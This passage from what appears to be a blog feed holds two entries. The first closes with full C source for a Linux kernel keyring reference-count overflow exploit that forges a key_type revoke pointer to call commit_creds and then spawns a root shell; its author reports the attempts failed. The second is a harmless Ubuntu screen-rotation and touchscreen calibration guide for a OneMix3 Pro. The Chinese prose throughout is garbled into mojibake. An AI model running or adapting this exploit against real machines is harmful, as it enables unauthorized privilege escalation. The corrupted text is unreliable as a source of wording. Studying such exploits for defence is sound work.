class="meta-string">&lt;keyutils.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">int</span> __attribute__((regparm(<span class="number">3</span>))) (* _commit_creds)(<span class="keyword">unsigned</span> <span class="keyword">long</span> cred);</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">unsigned</span> <span class="keyword">long</span> __attribute__((regparm(<span class="number">3</span>))) (* _prepare_kernel_cred)(<span class="keyword">unsigned</span> <span class="keyword">long</span> cred);</span><br><span class="line">_commit_creds commit_creds;</span><br><span class="line">_prepare_kernel_cred prepare_kernel_cred;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> STRUCT_LEN (0xb8 - 0x30)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> COMMIT_CREDS_ADDR (0xffffffff810957e0)	<span class="comment">//got from find_symbol	//(0xffffffff81094250)</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PREPARE_KERNEL_CREDS_ADDR (0xffffffff81095ae0)	<span class="comment">//got from find_symbol	//(0xffffffff81094550)</span></span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">key_type</span> &#123;</span></span><br><span class="line">    <span class="keyword">char</span> * name;</span><br><span class="line">    <span class="keyword">size_t</span> datalen;</span><br><span class="line">    <span class="keyword">void</span> * vet_description;</span><br><span class="line">    <span class="keyword">void</span> * preparse;</span><br><span class="line">    <span class="keyword">void</span> * free_preparse;</span><br><span class="line">    <span class="keyword">void</span> * instantiate;</span><br><span class="line">    <span class="keyword">void</span> * update;</span><br><span class="line">    <span class="keyword">void</span> * match_preparse;</span><br><span class="line">    <span class="keyword">void</span> * match_free;</span><br><span class="line">    <span class="keyword">void</span> * revoke;</span><br><span class="line">    <span class="keyword">void</span> * destroy;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">userspace_revoke</span><span class="params">(<span class="keyword">void</span> * key)</span> </span>&#123;</span><br><span class="line">    commit_creds(prepare_kernel_cred(<span class="number">0</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> *argv[])</span> </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span> *keyring_name;</span><br><span class="line">    <span class="keyword">size_t</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">int</span> l = <span class="number">0x100000000</span>/<span class="number">2</span>;</span><br><span class="line">    <span class="keyword">key_serial_t</span> serial = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">pid_t</span> pid = <span class="number">-1</span>;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">key_type</span> * <span class="title">my_key_type</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> &#123;</span> </span><br><span class="line">        <span class="keyword">long</span> mtype;</span><br><span class="line">        <span class="keyword">char</span> mtext[STRUCT_LEN];</span><br><span class="line">    &#125; msg = &#123;<span class="number">0x4141414141414141</span>, &#123;<span class="number">0</span>&#125;&#125;;</span><br><span class="line">    <span class="keyword">int</span> msqid;</span><br><span class="line">    <span class="keyword">if</span> (argc != <span class="number">2</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;usage: ./keys &lt;key_name&gt;&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;uid=%d, euid=%d\n&quot;</span>, getuid(), geteuid());</span><br><span class="line">    commit_creds = (_commit_creds) COMMIT_CREDS_ADDR;</span><br><span class="line">    prepare_kernel_cred = (_prepare_kernel_cred) PREPARE_KERNEL_CREDS_ADDR;</span><br><span class="line">    my_key_type = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(*my_key_type));</span><br><span class="line">    my_key_type-&gt;revoke = (<span class="keyword">void</span>*)userspace_revoke;</span><br><span class="line">    <span class="built_in">memset</span>(msg.mtext, <span class="string">&#x27;A&#x27;</span>, <span class="keyword">sizeof</span>(msg.mtext));</span><br><span class="line">    <span class="comment">// key-&gt;uid</span></span><br><span class="line">    *(<span class="keyword">int</span>*)(&amp;msg.mtext[<span class="number">56</span>]) = <span class="number">0x3e8</span>; <span class="comment">/* geteuid() */</span></span><br><span class="line">    <span class="comment">//key-&gt;perm</span></span><br><span class="line">    *(<span class="keyword">int</span>*)(&amp;msg.mtext[<span class="number">64</span>]) = <span class="number">0x3f3f3f3f</span>;</span><br><span class="line">    <span class="comment">//key-&gt;type</span></span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(&amp;msg.mtext[<span class="number">80</span>]) = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)my_key_type;</span><br><span class="line">    <span class="keyword">if</span> ((msqid = msgget(IPC_PRIVATE, <span class="number">0644</span> | IPC_CREAT)) == <span class="number">-1</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;msgget&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    keyring_name = argv[<span class="number">1</span>];</span><br><span class="line">    <span class="comment">/* Set the new session keyring before we start */</span></span><br><span class="line">    serial = keyctl(KEYCTL_JOIN_SESSION_KEYRING, keyring_name);</span><br><span class="line">    <span class="keyword">if</span> (serial &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;keyctl&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (keyctl(KEYCTL_SETPERM, serial, KEY_POS_ALL | KEY_USR_ALL | KEY_GRP_ALL | KEY_OTH_ALL) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;keyctl&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Increfing...&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt; <span class="number">0xfffffffd</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (i == (<span class="number">0xffffffff</span> - l)) &#123;</span><br><span class="line">            l = l/<span class="number">2</span>;</span><br><span class="line">            sleep(<span class="number">5</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">/*æ­¤å¤„ä¸ºä¸ªäººæ·»åŠ ï¼Œå¯åŠ¨æ€æ˜¾ç¤ºå†…æ ¸å¯¹è±¡çš„å¼•ç”¨è¿›åº¦*/</span></span><br><span class="line">		<span class="keyword">if</span> (i&lt;<span class="number">0xffffff00</span> &amp;&amp; i % <span class="number">429496</span>==<span class="number">0</span>)&#123;</span><br><span class="line">			<span class="keyword">double</span> tmp=i*<span class="number">1.0</span>/<span class="number">42949670</span>;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;\r\x1b[KProgress: %3.1lf%%\r&quot;</span>,tmp);</span><br><span class="line">			fflush(<span class="built_in">stdout</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">/***************************************/</span></span><br><span class="line">        <span class="keyword">if</span> (keyctl(KEYCTL_JOIN_SESSION_KEYRING, keyring_name) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            perror(<span class="string">&quot;keyctl&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    sleep(<span class="number">5</span>);</span><br><span class="line">    <span class="comment">/* here we are going to leak the last references to overflow */</span></span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">0</span>; i&lt;<span class="number">5</span>; ++i) &#123;</span><br><span class="line">        <span class="keyword">if</span> (keyctl(KEYCTL_JOIN_SESSION_KEYRING, keyring_name) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            perror(<span class="string">&quot;keyctl&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;finished increfing&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;forking...&quot;</span>);</span><br><span class="line">    <span class="comment">/* allocate msg struct in the kernel rewriting the freed keyring object */</span></span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">0</span>; i&lt;<span class="number">64</span>; i++) &#123;</span><br><span class="line">        pid = fork();</span><br><span class="line">        <span class="keyword">if</span> (pid == <span class="number">-1</span>) &#123;</span><br><span class="line">            perror(<span class="string">&quot;fork&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (pid == <span class="number">0</span>) &#123;</span><br><span class="line">            sleep(<span class="number">2</span>);</span><br><span class="line">            <span class="keyword">if</span> ((msqid = msgget(IPC_PRIVATE, <span class="number">0644</span> | IPC_CREAT)) == <span class="number">-1</span>) &#123;</span><br><span class="line">                perror(<span class="string">&quot;msgget&quot;</span>);</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">64</span>; i++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (msgsnd(msqid, &amp;msg, <span class="keyword">sizeof</span>(msg.mtext), <span class="number">0</span>) == <span class="number">-1</span>) &#123;</span><br><span class="line">                    perror(<span class="string">&quot;msgsnd&quot;</span>);</span><br><span class="line">                    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            sleep(<span class="number">-1</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;finished forking&quot;</span>);</span><br><span class="line">    sleep(<span class="number">5</span>);</span><br><span class="line">    <span class="comment">/* call userspace_revoke from kernel */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;caling revoke...&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (keyctl(KEYCTL_REVOKE, KEY_SPEC_SESSION_KEYRING) == <span class="number">-1</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;keyctl_revoke&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;uid=%d, euid=%d\n&quot;</span>, getuid(), geteuid());</span><br><span class="line">    execl(<span class="string">&quot;/bin/sh&quot;</span>, <span class="string">&quot;/bin/sh&quot;</span>, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>ç¼–è¯‘ï¼Œè¿è¡Œ</p>

<p>æ­¤æ—¶æŸ¥çœ‹/proc/keysçš„å†…å®¹å¯ä»¥çœ‹åˆ°keyringçš„å¼•ç”¨è®¡æ•°åœ¨å˜åŒ–(ubuntu14ä¸‹æ˜¯æ— è§„åˆ™å˜åŠ¨O_Oï¼Œå…¶ä»–ç³»ç»Ÿæ­£å¸¸)</p>

<p>ç»è¿‡æ¼«é•¿çš„ç­‰å¾…ï¼Œå¾—åˆ°å¦‚ä¸‹ç»“æœï¼š</p>

<p>å¹¶æ²¡æœ‰å¾—åˆ°rootã€‚ã€‚ã€‚</p>
<p>åˆ†åˆ«åœ¨ubuntu14ã€centos6.5ã€centos7.0ã€kaliç­‰å¹³å°çš„è™šæ‹Ÿæœºé‡Œå°è¯•ï¼Œéƒ½æ²¡æœ‰æˆåŠŸææƒã€‚ã€‚ã€‚çŒœæµ‹æ˜¯å› ä¸ºè™šæ‹Ÿæœºå†…å­˜çš„é‡Šæ”¾å’Œåˆ†é…å—å…¶ä»–å› ç´ å½±å“æ¯”è¾ƒå‰å®³ï¼Œä¸€ç›´æ— æ³•ä½¿ç›®æ ‡å‡½æ•°æŒ‡é’ˆåˆ†é…åˆ°æ­£ç¡®çš„ä½ç½®ã€‚ä¸€æ€’ä¹‹ä¸‹æŠŠå‡½æ•°åœ°å€åˆ†åˆ«æ”¹æˆ0x0å’Œ0x1ï¼Œå‡ºç° Ubuntuå‘ç”Ÿä¸¥é‡é”™è¯¯éœ€è¦é‡å¯ çš„å¯¹è¯æ¡†ï¼Œçœ‹èµ·æ¥æ˜¯æœ‰è¢«è°ƒç”¨çš„æ ·å­ã€‚ã€‚<br>å¦ï¼Œæ ¹æ®googleçš„ä¸€ä»½å¯¹åº”armä¸Šå®‰å“çš„ä»£ç (ç”¨syscallä»£æ›¿äº†ä¸€äº›api)ç¼–è¯‘äº†å®‰å“ä¸Šçš„pocï¼Œå°è¯•åœ¨CM12ä¸‹çš„ä¸€åŠ æ‰‹æœºä¸Šè¿è¡Œï¼š</p>
<img src="/2016/01/27/2016-01-27/1.pic.jpg" class="">
<p>ç®—äº†ä¸‹ï¼ŒæŒ‰è¿™é€Ÿåº¦ä¼°è®¡å¾—è·‘ä¸ªä¸ªæŠŠæœˆã€‚<br>(å¦ï¼Œç¬¬äºŒå¤©è§£é”æ‰‹æœºå‘ç°è¿›åº¦åœ¨0.018%ï¼Œä¼°è®¡æœ‰ç”Ÿä¹‹å¹´è·‘ä¸å®Œäº† T_T )ã€‚</p>
<p>ç”±äºå®è·µå¤±è´¥å¹¶æ²¡æœ‰å‡ºçœŸçŸ¥ï¼Œå› æ­¤åº¦è¿‡äº†ä¸€ä¸ªä¸æ„‰å¿«çš„å‘¨æœ«ã€‚ã€‚ã€‚</p>
]]></content>
      <categories>
        <category>tech</category>
      </categories>
      <tags>
        <tag>ubuntu</tag>
        <tag>vulns</tag>
      </tags>
  </entry>
  <entry>
    <title>ä¸€å·æœ¬ OneMix3 Pro Ubuntuå±å¹•æ ¡æ­£</title>
    <url>/2020/11/16/2020-11-16/</url>
    <content><![CDATA[<h2 id="èƒŒæ™¯"><a href="#èƒŒæ™¯" class="headerlink" title="èƒŒæ™¯"></a>èƒŒæ™¯</h2><p>ä¹‹å‰åœ¨ä¸€å·æœ¬ï¼ˆOneMix3 Proï¼‰ä¸Šè£…çš„Ubuntuç³»ç»Ÿå› ä¸ºæ‡’å¾—åšç¯å¢ƒåˆ†ç¦»ï¼Œç»ˆäºæŠŠç¯å¢ƒæä¹±äº† T_Tï¼Œé‚é‡è£…ä¸€ä¸‹Ubuntué¡ºä¾¿å‡åˆ°æœ€æ–°ç‰ˆ20.04ã€‚</p>
<p>ä¸€å·æœ¬æœ‰ç‚¹ZZï¼Œä¸»æ¿å±‚é¢è®¤ä¸ºå±å¹•æ˜¯ç«–ç€çš„ï¼Œæ‰€ä»¥é™¤åŸç”Ÿ win10 ï¼ŒåŠ äº†grubä¹‹åï¼Œgrubå’Œubuntué»˜è®¤éƒ½æ˜¯ç«–å±çš„ã€‚è€Œä¹‹å‰è£…ç³»ç»Ÿçš„æ—¶å€™æ²¡æœ‰åšè¿‡ç¨‹è®°å½•ï¼Œæ‰€ä»¥å¿˜äº†ä¸Šæ¬¡æ˜¯æ€ä¹ˆè§£å†³â€œç«–å±â€é—®é¢˜çš„äº†ã€‚ã€‚ã€‚</p>
<p>é‡æ–°googleä¸€ç•ªï¼Œä¸»è¦å‘ç°ä»¥ä¸‹æ–¹æ³•ã€‚</p>
<a id="more"></a>
<h2 id="æ–¹æ³•ä¸€"><a href="#æ–¹æ³•ä¸€" class="headerlink" title="æ–¹æ³•ä¸€"></a>æ–¹æ³•ä¸€</h2><p>æœ€å¿«é€Ÿä¹Ÿæ˜¯æœ€ä¸‘çš„æ–¹æ³•ï¼ŒUbuntué»˜è®¤æœ‰ä¸ªæœåŠ¡<code>iio-sensor-proxy</code>ï¼Œæœ‰ç‚¹ç±»ä¼¼æ‰‹æœºä¸Šçš„â€œå±å¹•æ—‹è½¬â€ï¼Œç„¶è€Œä¸€å·æœ¬çš„åŠ é€Ÿåº¦ä¼ æ„Ÿå™¨æ–¹å‘ä¸æ˜¯å¸¸è§„çš„æ–¹å‘ï¼Œæ‰€ä»¥è¿™ä¸ªæ—‹è½¬æ€»æ˜¯å¾€é”™è¯¯çš„æ–¹å‘ç¿»è½¬ï¼Œå¯ä»¥å¸è½½è¿™ä¸ªæœåŠ¡åï¼Œæ¯æ¬¡è¿›å…¥æ¡Œé¢æ‰‹åŠ¨è®¾ç½®å±å¹•æ–¹å‘ã€‚</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> å¸è½½æœåŠ¡</span></span><br><span class="line">x@One-Mix3-Pro:~$ sudo apt-get --purge remove iio-sensor-proxy</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> æŸ¥çœ‹å±å¹•åç§°ï¼Œè¿™é‡Œçœ‹åˆ°æ˜¯eDP-1</span></span><br><span class="line">x@One-Mix3-Pro:~$ xrandr --query</span><br><span class="line">Screen 0: minimum 320 x 200, current 2560 x 1600, maximum 16384 x 16384</span><br><span class="line">eDP-1 connected primary 2560x1600+0+0 left (normal left inverted right x axis y axis) 113mm x 181mm</span><br><span class="line">   1600x2560     55.86*+</span><br><span class="line">HDMI-1 disconnected (normal left inverted right x axis y axis)</span><br><span class="line">DP-1 disconnected (normal left inverted right x axis y axis)</span><br><span class="line">HDMI-2 disconnected (normal left inverted right x axis y axis)</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> æ¯æ¬¡ç™»é™†æ‰§è¡Œå±å¹•ç¿»è½¬ï¼Œå¯ä»¥å†™ä¸ªè‡ªå¯åŠ¨é¡¹</span></span><br><span class="line">x@One-Mix3-Pro:~$ xrandr --output eDP-1 --rotate left</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥å†™ä¸€ä¸ªgnomeå¯åŠ¨é¡¹ï¼Œæ§åˆ¶gnomeæ¯æ¬¡ç™»é™†çš„æ—¶å€™æ‰§è¡Œå±å¹•æ—‹è½¬ã€‚</p>
<p>æ‰“å¼€â€œå¯åŠ¨åº”ç”¨ç¨‹åºâ€ç¨‹åº</p>
<img src="/2020/11/16/2020-11-16/startup.jpg" class="">

<p>æˆ–è€…<code>alt + F2</code>è¿è¡Œ<code>gnome-session-properties</code>ï¼Œåœ¨å…¶ä¸­æ·»åŠ æ—‹è½¬å±å¹•å‘½ä»¤</p>
<img src="/2020/11/16/2020-11-16/startupapp.png" class="">

<p>å†æˆ–è€…ç›´æ¥shellé‡Œæ·»åŠ gnomeå¯åŠ¨é¡¹æ–‡ä»¶</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">x@One-Mix3-Pro:~/.config/autostart$ cat export.desktop</span><br><span class="line">[Desktop Entry]</span><br><span class="line">Type=Application</span><br><span class="line">Exec=export DISPLAY=:0;xrandr  --output eDP-1 --rotate left</span><br><span class="line">Hidden=false</span><br><span class="line">NoDisplay=false</span><br><span class="line">X-GNOME-Autostart-enabled=true</span><br><span class="line">Name[zh_CN]=screen rotate</span><br><span class="line">Name=screen rotate</span><br><span class="line">Comment[zh_CN]=aaa</span><br><span class="line">Comment=Rotate the default screen</span><br></pre></td></tr></table></figure>

<p>Ubuntu 20.04ä¸Šä¸çŸ¥é“ä¸ºä»€ä¹ˆè¿™ä¸ªå¯åŠ¨é¡¹ç»å¸¸ä¸å…è®¸ï¼Œè€ç‰ˆæœ¬Ubuntuè¿™ä¸ªå¯åŠ¨é¡¹è¿˜æ˜¯æœ‰ç‚¹ç”¨çš„ã€‚</p>
<h2 id="æ–¹æ³•äºŒ"><a href="#æ–¹æ³•äºŒ" class="headerlink" title="æ–¹æ³•äºŒ"></a>æ–¹æ³•äºŒ</h2><p>ä¸Šé¢çš„æ–¹æ³•é€šè¿‡å¸è½½â€œå±å¹•æ—‹è½¬â€æœåŠ¡ï¼Œä½¿å¾—å±å¹•ä¸ä¼šè¢«é”™è¯¯çš„æ—‹è½¬ï¼Œä½†ä¹Ÿé€ æˆå±å¹•æ²¡æ³•è‡ªåŠ¨æ—‹è½¬ã€‚ä¸å¤ªå–œæ¬¢è¿™ç§å› å™åºŸé£Ÿçš„åšæ³•ï¼Œé‡æ–°å®‰è£…ä¸Š<code>iio-sensor-proxy</code>ï¼Œç»§ç»­çœ‹äº†ä¸‹å…¶ä»–æ–¹æ³•ã€‚</p>
<p>æŸ¥é˜…äº†ä¸€äº›<span class="exturl" data-url="aHR0cHM6Ly9naXQua2VybmVsLm9yZy9wdWIvc2NtL2xpbnV4L2tlcm5lbC9naXQvamljMjMvaWlvLmdpdC90cmVlL0RvY3VtZW50YXRpb24vQUJJL3Rlc3Rpbmcvc3lzZnMtYnVzLWlpbyNuMTYzOA==" title="https://git.kernel.org/pub/scm/linux/kernel/git/jic23/iio.git/tree/Documentation/ABI/testing/sysfs-bus-iio#n1638">æ–‡æ¡£<i class="fa fa-external-link"></i></span>ï¼Œå‘ç°åŠ é€Ÿåº¦ä¼ æ„Ÿå™¨çš„çŸ©é˜µå¯ä»¥æ‰‹å·¥æ ¡å‡†ï¼Œå‚è€ƒ<span class="exturl" data-url="aHR0cHM6Ly93d3cucmVkZGl0LmNvbS9yL0dQRFBvY2tldC9jb21tZW50cy9jZTZqeHIvb25lbWl4XzNzX3lvZ2Ffd191YnVudHVfMTgwNDJfaG93X2RvX2lfdGVsbF9pdC8=" title="https://www.reddit.com/r/GPDPocket/comments/ce6jxr/onemix_3s_yoga_w_ubuntu_18042_how_do_i_tell_it/">reddit<i class="fa fa-external-link"></i></span>ç½‘å‹çš„å¸–å­ï¼Œå…ˆå¯»æ‰¾åŠ é€Ÿåº¦è®¾å¤‡çš„åç§°ï¼š</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@One-Mix3-Pro:~# cat /sys/`udevadm info -q path -n /dev/iio:device0`/../modalias</span><br><span class="line">acpi:BOSC0200:BOSC0200:</span><br></pre></td></tr></table></figure>

<p>è·å–åˆ°çš„è®¾å¤‡åç§°ä¸º<code>acpi:BOSC0200:BOSC0200:</code>ï¼Œå¢åŠ <code>61-sensor-local.hwdb</code>é…ç½®æ–‡ä»¶ï¼Œè®¾å¤‡åä¸ºä»¥ä¸‹æ ¼å¼ï¼Œå¹¶å¯¹<code>ACCEL_MOUNT_MATRIX</code>çŸ©é˜µè¿›è¡Œå¦‚ä¸‹è°ƒæ•´ï¼Œæ›´æ–°ç¡¬ä»¶æ•°æ®åº“ï¼š</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@One-Mix3-Pro:~# cat /etc/udev/hwdb.d/61-sensor-local.hwdb      # ä¿®æ”¹ä¸ºå¦‚ä¸‹å†…å®¹</span><br><span class="line">sensor:modalias:acpi:BOSC0200*:dmi:*:*</span><br><span class="line"> ACCEL_MOUNT_MATRIX= -1, 0, 0; 0, 1, 0; 0, 0, 1  # 3x3çŸ©é˜µ</span><br><span class="line">root@One-Mix3-Pro:~# systemd-hwdb update                            # æ›´æ–°ç¡¬ä»¶æ•°æ®åº“</span><br></pre></td></tr></table></figure>

<p>ä¿®æ”¹çŸ©é˜µçš„æ—¶å€™å¯ä»¥å‚è€ƒ<code>monitor-sensor</code>çš„å†…å®¹ï¼Œä¸æ–­è°ƒæ•´è®¾å¤‡å§¿æ€ï¼Œç¡®å®šåŸç”ŸåŠ é€Ÿåº¦ä¼ æ„Ÿå™¨æ–¹å‘ã€‚</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@One-Mix3-Pro:~# monitor-sensor</span><br><span class="line">    Waiting for iio-sensor-proxy to appear</span><br><span class="line">+++ iio-sensor-proxy appeared</span><br><span class="line">=== Has accelerometer (orientation: left-up)</span><br><span class="line">=== No ambient light sensor</span><br><span class="line">    Accelerometer orientation changed: bottom-up</span><br><span class="line">    Accelerometer orientation changed: left-up</span><br><span class="line">    Accelerometer orientation changed: normal</span><br><span class="line">    Accelerometer orientation changed: right-up</span><br><span class="line">    Accelerometer orientation changed: normal</span><br><span class="line">    Accelerometer orientation changed: left-up</span><br><span class="line">    Accelerometer orientation changed: normal</span><br><span class="line">    Accelerometer orientation changed: left-up</span><br></pre></td></tr></table></figure>

<p>é‡å¯å¹¶ç™»é™†ä»¥åï¼Œå±å¹•åŸºæœ¬å¯ä»¥æŒ‰æ­£ç¡®çš„é‡åŠ›æ–¹å‘è¿›è¡Œæ—‹è½¬äº†ã€‚é‚£ä¹ˆè¿™ä¸ªæ—¶å€™æ–°çš„é—®é¢˜å°±å‡ºç°äº†ğŸ˜‚ï¼Œè§¦å±ä¼šå¶å‘æ€§çš„æ²¡æœ‰è·Ÿéšè¿›è¡Œæ—‹è½¬ï¼Œè¿™æ ·å°±ä¼šå¯¼è‡´ä½ ç‚¹å³è¾¹ï¼Œå·¦è¾¹çš„ç¨‹åºå¯åŠ¨äº†ã€‚ã€‚ã€‚</p>
<p>ä¾æ—§æŸ¥é˜…æ–‡æ¡£ï¼Œå‘ç°æœ‰ä¸ªè¾“å…¥è®¾å¤‡çš„çŸ©é˜µï¼ŒæŸ¥çœ‹å½“å‰è¾“å…¥è®¾å¤‡ï¼š</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">x@One-Mix3-Pro:~$ xinput --list</span><br><span class="line">â¡ Virtual core pointer                    	id=2	[master pointer  (3)]</span><br><span class="line">âœ   â†³ Virtual core XTEST pointer              	id=4	[slave  pointer  (2)]</span><br><span class="line">âœ   â†³ HAILUCK CO.,LTD USB KEYBOARD Mouse      	id=11	[slave  pointer  (2)]</span><br><span class="line">âœ   â†³ GXTP7386:00 27C6:0113                   	id=15	[slave  pointer  (2)]</span><br><span class="line">âœ   â†³ GXTP7386:00 27C6:0113 Stylus            	id=16	[slave  pointer  (2)]</span><br><span class="line">â£ Virtual core keyboard                   	id=3	[master keyboard (2)]</span><br><span class="line">    â†³ Virtual core XTEST keyboard             	id=5	[slave  keyboard (3)]</span><br><span class="line">    â†³ Power Button                            	id=6	[slave  keyboard (3)]</span><br><span class="line">    â†³ Video Bus                               	id=7	[slave  keyboard (3)]</span><br><span class="line">    â†³ Power Button                            	id=8	[slave  keyboard (3)]</span><br><span class="line">    â†³ Sleep Button                            	id=9	[slave  keyboard (3)]</span><br><span class="line">    â†³ HAILUCK CO.,LTD USB KEYBOARD            	id=10	[slave  keyboard (3)]</span><br><span class="line">    â†³ HAILUCK CO.,LTD USB KEYBOARD System Control	id=12	[slave  keyboard (3)]</span><br><span class="line">    â†³ HAILUCK CO.,LTD USB KEYBOARD Consumer Control	id=13	[slave  keyboard (3)]</span><br><span class="line">    â†³ HAILUCK CO.,LTD USB KEYBOARD Wireless Radio Control	id=14	[slave  keyboard (3)]</span><br><span class="line">    â†³ GXTP7386:00 27C6:0113 Keyboard          	id=17	[slave  keyboard (3)]</span><br><span class="line">    â†³ AT Translated Set 2 keyboard            	id=18	[slave  keyboard (3)]</span><br></pre></td></tr></table></figure>

<p><code>id=15</code>çš„<code>GXTP7386:00 27C6:0113</code>æ˜¯è§¦å±è®¾å¤‡ï¼ŒæŸ¥çœ‹è¿™ä¸ªè®¾å¤‡çš„å±æ€§ä¿¡æ¯ï¼š</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">x@One-Mix3-Pro:~$ xinput list-props 15</span><br><span class="line">Device &#x27;GXTP7386:00 27C6:0113&#x27;:</span><br><span class="line">	Device Enabled (168):	1</span><br><span class="line">	Coordinate Transformation Matrix (170):	0.000000, -1.000000, 1.000000, 1.000000, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000</span><br><span class="line">	libinput Calibration Matrix (323):	1.000000, 0.000000, 0.000000, 0.000000, 1.000000, 0.000000, 0.000000, 0.000000, 1.000000</span><br><span class="line">	libinput Calibration Matrix Default (324):	1.000000, 0.000000, 0.000000, 0.000000, 1.000000, 0.000000, 0.000000, 0.000000, 1.000000</span><br><span class="line">	libinput Send Events Modes Available (288):	1, 0</span><br><span class="line">	libinput Send Events Mode Enabled (289):	0, 0</span><br><span class="line">	libinput Send Events Mode Enabled Default (290):	0, 0</span><br><span class="line">	Device Node (291):	&quot;/dev/input/event6&quot;</span><br><span class="line">	Device Product ID (292):	10182, 275</span><br></pre></td></tr></table></figure>

<p>æœ€åå†™äº†ä¸ªè„šæœ¬ï¼ŒæŠŠå±å¹•æ—‹è½¬çš„éƒ¨åˆ†å’Œè§¦æ‘¸å±è¯†åˆ«æ—‹è½¬çš„éƒ¨åˆ†åˆåœ¨ä¸€èµ·ï¼Œå½“è§¦æ‘¸å±è¯†åˆ«æ²¡æœ‰è·Ÿéšæ—‹è½¬æ—¶æ‰§è¡Œä¸€ä¸‹ã€‚</p>
